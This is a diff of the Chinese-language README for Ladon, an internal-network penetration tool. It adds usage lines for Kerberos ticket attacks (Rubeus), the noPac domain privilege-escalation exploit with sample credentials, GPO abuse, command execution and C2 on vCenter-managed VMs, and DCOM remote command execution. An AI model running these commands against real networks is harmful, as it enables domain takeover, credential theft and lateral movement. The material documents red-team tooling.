@@ -1,8 +1,8 @@
-## Ladon 11.4 20230801
+## Ladon 11.6 20230911
 ![](https://k8gege.github.io/k8img/Ladon/Dragon.jpg)
 
 [![Author](https://img.shields.io/badge/Author-k8gege-blueviolet)](https://github.com/k8gege) 
-[![Ladon](https://img.shields.io/badge/Ladon-11.4-yellowgreen)](https://github.com/k8gege/Ladon) 
+[![Ladon](https://img.shields.io/badge/Ladon-11.6-yellowgreen)](https://github.com/k8gege/Ladon) 
 [![Bin](https://img.shields.io/badge/Ladon-Bin-ff69b4)](https://github.com/k8gege/Ladon/releases) 
 [![GitHub issues](https://img.shields.io/github/issues/k8gege/Ladon)](https://github.com/k8gege/Ladon/issues) 
 [![Github Stars](https://img.shields.io/github/stars/k8gege/Ladon)](https://github.com/k8gege/Ladon) 
@@ -16,7 +16,7 @@
 
 ### 程序简介
 
-Ladon大型内网渗透工具，可PowerShell模块化、可CS插件化、可内存加载，无文件扫描。含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。11.4版本内置245功能模块,网络资产探测模块30+协议(ICMP\NBT\DNS\MAC\SMB\WMI\SSH\HTTP\HTTPS\Exchange\mssql\FTP\RDP)以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、交换机、数据库、打印机等信息，高危漏洞检测16+包含Cisco、Zimbra、Exchange、DrayTek、MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列、Printer等，密码审计25+含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(smbexec/wmiexe/psexec/atexec/sshexec/webshell),Web指纹识别模块可识别135+（Web应用、中间件、脚本类型、页面类型）等，本地提权21+含SweetPotato\BadPotato\EfsPotato\BypassUAC,可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。
+Ladon大型内网渗透\域渗透\横向工具，可PowerShell模块化、可CS插件化、可内存加载，无文件扫描。含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。11.6版本内置252功能模块,网络资产探测模块30+协议(ICMP\NBT\DNS\MAC\SMB\WMI\SSH\HTTP\HTTPS\Exchange\mssql\FTP\RDP)以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、交换机、数据库、打印机等信息，高危漏洞检测16+包含Cisco、Zimbra、Exchange、DrayTek、MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列、Printer等，密码审计25+含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(smbexec/wmiexe/psexec/atexec/sshexec/webshell),Web指纹识别模块可识别135+（Web应用、中间件、脚本类型、页面类型）等，本地提权21+含SweetPotato\BadPotato\EfsPotato\BypassUAC,可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。
 
 ### 使用简单
 
@@ -1703,6 +1703,75 @@ Ladon AddUser admin$ 123456
 ##### 245 API删除用户(无视系统net、net1.exe禁用)
 ```Bash	
 Ladon DelUser admin$
+```
+
+##### 246 Rubeus域渗透 Kerberos攻击
+比如TGT请求/ST请求/AS-REP Roasting/Kerberoasting/委派攻击/黄金票据/白银票据/钻石票据/蓝宝石票据等
+```Bash	
+Ladon Rubeus
+```
+
+##### 247 noPac域渗透 域内提权CVE-2021-42287/CVE-2021-42278
+```Bash	
+CVE-2021-42287/CVE-2021-42278 Scanner & Exploiter
+
+/domain /user /pass argument needed for scanning
+/dc /mAccount /nPassword argument needed for exploitation
+
+Examples:
+  Ladon.exe noPac scan -domain htb.local -user domain_user -pass 'Password123!'
+  Ladon.exe noPac -dc dc02.htb.local -mAccount demo -mPassword Password123!
+  Ladon.exe noPac -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo /mPassword Password123!
+  Ladon.exe noPac -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
+```
+
+##### 248 SharpGPOAbuse
+```Bash	
+Ladon SharpGPOAbuse
+```
+
+##### 249 SharpSphere 与vCenter管理的虚拟机的来宾操作系统进行交互 执行命令
+```Bash	
+Ladon SharpSphere
+
+  No verb selected.
+
+  dump        Snapshot and download memory dump file
+
+  list        List all VMs managed by this vCenter
+
+  execute     Execute given command in target VM
+
+  c2          Run C2 using C3's VMwareShareFile module
+
+  upload      Upload file to target VM
+
+  download    Download file from target VM
+
+  help        Display more information on a specific command.
+
+  version     Display version information.
+```
+
+##### 250 Dcom远程执行命令之MMC20
+```Bash	
+Ladon MmcExec host cmdline
+Ladon MmcExec 127.0.0.1 calc
+Ladon MmcExec 127.0.0.1 Y2FsYw==
+```
+
+##### 251 Dcom远程执行命令之ShellWindows
+```Bash	
+Ladon ShellExec host cmdline
+Ladon ShellExec 127.0.0.1 calc
+Ladon ShellExec 127.0.0.1 Y2FsYw==
+```
+
+##### 252 Dcom远程执行命令之ShellBrowserWindow
+```Bash	
+Ladon ShellBrowserExec host cmdline
+Ladon ShellBrowserExec 127.0.0.1 calc
+Ladon ShellBrowserExec 127.0.0.1 Y2FsYw==
 ```
 
 =======================================================
